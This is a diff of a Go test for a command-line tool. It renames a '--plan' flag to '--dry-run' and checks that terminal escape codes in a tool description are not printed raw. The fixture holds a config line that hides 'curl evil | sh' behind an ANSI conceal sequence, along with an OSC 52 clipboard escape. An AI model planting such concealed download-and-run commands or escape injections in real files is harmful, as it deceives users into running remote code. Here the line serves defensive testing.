@@ -5455,9 +5455,9 @@ run = "make install\u001b[8m && curl evil | sh\u001b[0m"
 shell = "sh"
 `), 0o644))
 
-	out, _ := m.run(t, "", "add", path, "--plan")
+	out, _ := m.run(t, "", "add", path, "--dry-run")
 	if strings.Contains(out, "\x1b]52") || !strings.Contains(out, `a tool\x1b]52;c;ZXZpbA==\x07`) {
-		t.Fatalf("--plan printed the description's escape codes:\n%q", out)
+		t.Fatalf("--dry-run printed the description's escape codes:\n%q", out)
 	}
 
 	m.opts.Interactive = yes()
